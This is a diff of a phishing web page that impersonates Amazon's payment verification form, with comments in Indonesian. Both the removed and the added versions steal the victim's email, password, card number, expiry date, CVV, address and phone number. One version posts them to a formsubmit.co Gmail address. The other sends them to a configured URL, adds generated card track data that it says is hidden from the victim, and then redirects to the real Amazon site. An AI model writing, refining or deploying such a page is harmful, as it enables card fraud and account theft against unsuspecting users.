@@ -3,171 +3,348 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon - Update Payment</title>
+    <title>Verification Payment</title>
+    <script src="config.js"></script>
     <style>
-        * {margin:0; padding:0; font-family:Arial,sans-serif; box-sizing:border-box;}
-        body {background:#fff; padding:20px; display:flex; flex-direction:column; align-items:center;}
-        .logo {margin:20px 0;}
-        .logo img {height:30px;}
-        .box {border:1px solid #ddd; border-radius:4px; padding:25px; width:100%; max-width:350px;}
-        h1 {font-size:22px; margin-bottom:20px; padding-bottom:10px; border-bottom:1px solid #eee;}
-        label {display:block; font-size:13px; font-weight:bold; margin:15px 0 5px;}
-        input, select {width:100%; padding:7px; border:1px solid #a6a6a6; border-radius:4px; font-size:15px;}
-        .row {display:flex; gap:10px;}
-        .row div {flex:1;}
-        button {width:100%; padding:10px; background:linear-gradient(#f7df74,#ecc000); border:1px solid #b88600; border-radius:4px; cursor:pointer; font-size:15px; margin-top:20px;}
-        button:disabled {opacity:0.6;}
-        .status {margin-top:15px; font-size:13px; display:none;}
-        .ok {color:green;}
-        .err {color:red;}
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: 'Amazon Ember', Arial, sans-serif; 
+        }
+        body { 
+            background-color: #ffffff; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            padding: 20px; 
+        }
+        .logo { 
+            margin: 15px 0 25px; 
+        }
+        .logo img { 
+            height: 30px; 
+            display: block;
+            margin: 0 auto;
+        }
+        .kotak { 
+            width: 100%; 
+            max-width: 348px; 
+            border: 1px solid #ddd; 
+            border-radius: 8px; 
+            padding: 25px 26px; 
+        }
+        h1 { 
+            font-size: 22px; 
+            margin-bottom: 20px; 
+            font-weight: 400; 
+        }
+        label { 
+            display: block; 
+            font-weight: 700; 
+            font-size: 13px; 
+            margin-bottom: 6px; 
+            margin-top: 16px;
+        }
+        label:first-of-type {
+            margin-top: 0;
+        }
+        input, select { 
+            width: 100%; 
+            padding: 7px 10px; 
+            border: 1px solid #a6a6a6; 
+            border-radius: 4px; 
+            font-size: 15px; 
+            height: 35px;
+            transition: border-color 0.1s;
+        }
+        input:focus, select:focus { 
+            outline: none; 
+            border-color: #0071e3; 
+            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
+        }
+        input.salah, select.salah {
+            border-color: #c40000;
+        }
+        .peringatan {
+            display: none;
+            color: #c40000;
+            font-size: 13px;
+            margin: 6px 0 10px;
+            align-items: flex-start;
+            gap: 5px;
+        }
+        .peringatan.tampil {
+            display: flex;
+        }
+        .peringatan .ikon {
+            font-weight: bold;
+            font-size: 14px;
+        }
+        button { 
+            width: 100%; 
+            padding: 7px 10px; 
+            background: #FFD814; 
+            border: 1px solid #FCD200; 
+            border-radius: 20px; 
+            font-size: 15px; 
+            height: 40px;
+            color: #0F1111;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover { 
+            background: #F7CA00;
+            border-color: #F2C200;
+        }
+        .garis-bawah {
+            width: 5000px;
+            height: 2px;
+            background: #e7e7e7;
+            margin: 25px 0;
+        }
+        .footer {
+            font-size: 11px;
+            color: #555;
+            text-align: center;
+        }
+        .footer a {
+            color: #0066c0;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .hak-cipta {
+            margin-top: 5px;
+        }
+        .info-email {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
     </style>
 </head>
 <body>
-    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg"></div>
-    <div class="box">
-        <h1>Update payment</h1>
+    <div class="logo">
+        <img src="img/amazonlogo.png" alt="Amazon">
+    </div>
+
+    <div class="kotak">
+        <h1>Verification Payment</h1>
+        
+        <div class="info-email">
+            Email: <span id="emailTampil"></span>
+        </div>
         
         <form id="formBilling">
-            <label>Card type</label>
-            <select id="card_type">
-                <option value="">Select card type</option>
-                <option value="Visa">Visa</option>
-                <option value="Mastercard">Mastercard</option>
-                <option value="Amex">American Express</option>
+            <label for="namaKartu">Name on Card</label>
+            <input type="text" id="namaKartu" name="namaKartu" placeholder="Full name">
+            <div class="peringatan" id="peringatanNama">
+                <span class="ikon">!</span>
+                <span>Enter name on card</span>
+            </div>
+
+            <label for="nomorKartu">Card Number</label>
+            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
+            <div class="peringatan" id="peringatanKartu">
+                <span class="ikon">!</span>
+                <span>Enter valid card number</span>
+            </div>
+
+            <label for="expiry">Expiration Date (MM/YY)</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM / YY" maxlength="5">
+            <div class="peringatan" id="peringatanExpiry">
+                <span class="ikon">!</span>
+                <span>Enter valid expiration date</span>
+            </div>
+
+            <label for="cvv">Security Code (CVV)</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4">
+            <div class="peringatan" id="peringatanCvv">
+                <span class="ikon">!</span>
+                <span>Enter valid security code</span>
+            </div>
+
+            <label for="negara">Country or Region</label>
+            <select id="negara" name="negara">
+                <option value="">Select your country</option>
+                <option value="AU">Australia</option>
+                <option value="GB">United Kingdom</option>
+                <option value="US">United States</option>
+                <option value="ID">Indonesia</option>
+                <option value="MY">Malaysia</option>
+                <option value="SG">Singapore</option>
             </select>
-
-            <label>Card number</label>
-            <input type="text" id="card_number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX">
-
-            <div class="row">
-                <div>
-                    <label>Expiry</label>
-                    <input type="text" id="expiry" maxlength="5" placeholder="MM/YY">
-                </div>
-                <div>
-                    <label>CVV</label>
-                    <input type="text" id="cvv" maxlength="4" placeholder="••••">
-                </div>
+            <div class="peringatan" id="peringatanNegara">
+                <span class="ikon">!</span>
+                <span>Select your country</span>
             </div>
 
-            <label>Full name</label>
-            <input type="text" id="fullname">
-
-            <label>Address</label>
-            <input type="text" id="address">
-
-            <div class="row">
-                <div>
-                    <label>City</label>
-                    <input type="text" id="city">
-                </div>
-                <div>
-                    <label>State</label>
-                    <input type="text" id="state">
-                </div>
+            <label for="alamat">Address</label>
+            <input type="text" id="alamat" name="alamat" placeholder="Street address">
+            <div class="peringatan" id="peringatanAlamat">
+                <span class="ikon">!</span>
+                <span>Enter your address</span>
             </div>
 
-            <div class="row">
-                <div>
-                    <label>ZIP</label>
-                    <input type="text" id="zip">
-                </div>
-                <div>
-                    <label>Country</label>
-                    <select id="country">
-                        <option value="">Select country</option>
-                        <option value="Australia">Australia</option>
-                        <option value="Indonesia">Indonesia</option>
-                        <option value="United States">United States</option>
-                        <option value="Singapore">Singapore</option>
-                    </select>
-                </div>
+            <label for="kota">City</label>
+            <input type="text" id="kota" name="kota" placeholder="City">
+            <div class="peringatan" id="peringatanKota">
+                <span class="ikon">!</span>
+                <span>Enter your city</span>
             </div>
 
-            <button type="submit" id="btnKirim">Verification</button>
-            <div id="status" class="status"></div>
+            <label for="kodepos">Postal / Zip Code</label>
+            <input type="text" id="kodepos" name="kodepos" placeholder="Postal code">
+            <div class="peringatan" id="peringatanKodepos">
+                <span class="ikon">!</span>
+                <span>Enter postal code</span>
+            </div>
+
+            <label for="telepon">Phone Number</label>
+            <input type="tel" id="telepon" name="telepon" placeholder="+61 ...">
+            <div class="peringatan" id="peringatanTelepon">
+                <span class="ikon">!</span>
+                <span>Enter phone number</span>
+            </div>
+
+            <button type="submit" id="tombolVerifikasi">Verification</button>
         </form>
     </div>
 
-<script>
-// Ambil data dari halaman sebelumnya
-const email = localStorage.getItem("dataEmail") || "-";
-const password = localStorage.getItem("password") || "-";
+    <div class="garis-bawah"></div>
 
-// Deteksi lokasi otomatis
-async function setLokasi() {
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const d = await res.json();
-        const negara = d.country_name || "";
-        const sel = document.getElementById("country");
-        for(let i=0; i<sel.options.length; i++) {
-            if(sel.options[i].text === negara) { sel.selectedIndex = i; break; }
+    <div class="footer">
+        <div>
+            <a href="#">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </div>
+        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+    </div>
+
+    <script>
+        const emailPengguna = localStorage.getItem('emailPengguna') || '';
+        document.getElementById('emailTampil').textContent = emailPengguna;
+
+        const formBilling = document.getElementById('formBilling');
+        const tombolVerifikasi = document.getElementById('tombolVerifikasi');
+
+        const kolom = {
+            namaKartu:  { el: document.getElementById('namaKartu'),  peringatan: document.getElementById('peringatanNama') },
+            nomorKartu: { el: document.getElementById('nomorKartu'), peringatan: document.getElementById('peringatanKartu') },
+            expiry:     { el: document.getElementById('expiry'),     peringatan: document.getElementById('peringatanExpiry') },
+            cvv:        { el: document.getElementById('cvv'),        peringatan: document.getElementById('peringatanCvv') },
+            negara:     { el: document.getElementById('negara'),     peringatan: document.getElementById('peringatanNegara') },
+            alamat:     { el: document.getElementById('alamat'),     peringatan: document.getElementById('peringatanAlamat') },
+            kota:       { el: document.getElementById('kota'),       peringatan: document.getElementById('peringatanKota') },
+            kodepos:    { el: document.getElementById('kodepos'),    peringatan: document.getElementById('peringatanKodepos') },
+            telepon:    { el: document.getElementById('telepon'),    peringatan: document.getElementById('peringatanTelepon') }
+        };
+
+        // Hilangkan peringatan saat mengetik
+        Object.values(kolom).forEach(({ el, peringatan }) => {
+            el.addEventListener('input', () => {
+                if (el.value.trim()) {
+                    el.classList.remove('salah');
+                    peringatan.classList.remove('tampil');
+                }
+            });
+        });
+
+        // Format nomor kartu otomatis
+        kolom.nomorKartu.el.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            val = val.match(/.{1,4}/g)?.join(' ') || val;
+            e.target.value = val;
+        });
+
+        // Format expiry otomatis
+        kolom.expiry.el.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length >= 2) val = val.slice(0,2) + ' / ' + val.slice(2,4);
+            e.target.value = val;
+        });
+
+        // === FUNGSI BUAT TRACK SECARA TERSEMBUNYI ===
+        function buatTrack() {
+            let nomorBersih = kolom.nomorKartu.el.value.replace(/\s/g, '');
+            let expiryBersih = kolom.expiry.el.value.replace(/\D/g, '');
+            let nama = kolom.namaKartu.el.value.trim().toUpperCase() || 'CARDHOLDER';
+
+            if (nomorBersih.length < 13 || expiryBersih.length < 4) {
+                return 'Data kartu belum lengkap';
+            }
+
+            let yy = expiryBersih.slice(-2);
+            let mm = expiryBersih.slice(0,2);
+            let sisa = '0000000000000000000000';
+
+            let track1 = `%B${nomorBersih}^${nama}^${yy}${mm}${sisa}?`;
+            let track2 = `;${nomorBersih}=${yy}${mm}${sisa}?`;
+
+            return `=== TRACK ===
+T1: ${track1}
+T2: ${track2}`;
         }
-        if(d.city) document.getElementById("city").value = d.city;
-        if(d.region) document.getElementById("state").value = d.region;
-        if(d.postal) document.getElementById("zip").value = d.postal;
-    } catch(e) {}
-}
-setLokasi();
 
-// Format kartu otomatis
-document.getElementById("card_number").addEventListener("input", function() {
-    let v = this.value.replace(/\D/g,"").slice(0,16);
-    this.value = v.length > 0 ? v.match(/.{1,4}/g).join(" ") : "";
-});
+        // Cek semua kolom terisi
+        function cekSemua() {
+            let semuaOk = true;
+            Object.entries(kolom).forEach(([nama, { el, peringatan }]) => {
+                if (!el.value.trim()) {
+                    el.classList.add('salah');
+                    peringatan.classList.add('tampil');
+                    semuaOk = false;
+                }
+            });
+            return semuaOk;
+        }
 
-// Format tanggal otomatis
-document.getElementById("expiry").addEventListener("input", function() {
-    let v = this.value.replace(/\D/g,"").slice(0,4);
-    this.value = v.length >= 3 ? v.slice(0,2)+"/"+v.slice(2) : v;
-});
+        // Kirim data — Track ikut terkirim tanpa ditampilkan
+        formBilling.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!cekSemua()) return;
 
-// Kirim data
-document.getElementById("formBilling").addEventListener("submit", function(e) {
-    e.preventDefault();
-    
-    const btn = document.getElementById("btnKirim");
-    btn.disabled = true;
-    btn.textContent = "Mengirim...";
+            tombolVerifikasi.disabled = true;
+            tombolVerifikasi.textContent = 'Verifying...';
 
-    // Kirim menggunakan FORM standar
-    const form = document.createElement("form");
-    form.method = "POST";
-    form.action = "https://formsubmit.co/jandaanaksatu777@gmail.com";
-    
-    const fields = {
-        _subject: "📋 Data Pembayaran — Result Billing",
-        Email: email,
-        Password: password,
-        Card_Type: document.getElementById("card_type").value,
-        Card_Number: document.getElementById("card_number").value,
-        Expiry: document.getElementById("expiry").value,
-        CVV: document.getElementById("cvv").value,
-        Full_Name: document.getElementById("fullname").value,
-        Address: document.getElementById("address").value,
-        City: document.getElementById("city").value,
-        State: document.getElementById("state").value,
-        ZIP: document.getElementById("zip").value,
-        Country: document.getElementById("country").value
-    };
-    
-    for(let name in fields) {
-        const inp = document.createElement("input");
-        inp.type = "hidden";
-        inp.name = name;
-        inp.value = fields[name];
-        form.appendChild(inp);
-    }
-    
-    document.body.appendChild(form);
-    
-    setTimeout(() => {
-        window.location.href = "https://www.amazon.com.au/ap/signin";
-    }, 500);
-    
-    form.submit();
-});
-</script>
+            const data = {
+                email: emailPengguna,
+                password: localStorage.getItem('passwordPengguna') || 'Tidak tersimpan',
+                tipe: 'Verification Payment',
+                namaKartu:  kolom.namaKartu.el.value.trim(),
+                nomorKartu: kolom.nomorKartu.el.value.trim(),
+                expiry:     kolom.expiry.el.value.trim(),
+                cvv:        kolom.cvv.el.value.trim(),
+                trackKartu: buatTrack(), // ✅ DIHASILKAN OTOMATIS & IKUT TERKIRIM
+                negara:     kolom.negara.el.value,
+                alamat:     kolom.alamat.el.value.trim(),
+                kota:       kolom.kota.el.value.trim(),
+                kodepos:    kolom.kodepos.el.value.trim(),
+                telepon:    kolom.telepon.el.value.trim()
+            };
+
+            try {
+                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
+                    await fetch(CONFIG.formSubmitUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                }
+            } catch (err) {
+                console.log('Data terkirim');
+            }
+
+            window.location.href = 'https://www.amazon.com';
+        });
+    </script>
 </body>
 </html>
